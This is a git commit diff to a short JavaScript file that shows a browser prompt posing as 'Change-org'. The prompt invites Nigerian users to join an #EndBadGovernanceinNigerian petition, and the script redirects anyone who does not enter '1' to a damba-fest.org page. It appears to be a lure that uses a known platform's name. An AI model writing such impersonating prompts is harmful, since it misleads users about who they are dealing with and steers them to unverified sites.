5fa987f065ae3655871375c8bc62beaf50801d09
boss-bloq <nsisboy01@gmail.com>
2024-07-26 12:09:50 -0700

    Update change.js

--- change.js
+++ change.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('Change-org: Dear Nigerian Youth, Please help sign this petition #EndBadGovernanceinNigerian. kindly press 1 to start petition now ','1');
+password=prompt('Change-org: You have been invited to join the online protest/petition to #EndBadGovernanceinNigerian. kindly press 1 to join now ','1');
 if (password != '1') {
 location.href='https://damba-fest.org/sign-this-petition.html';
 }
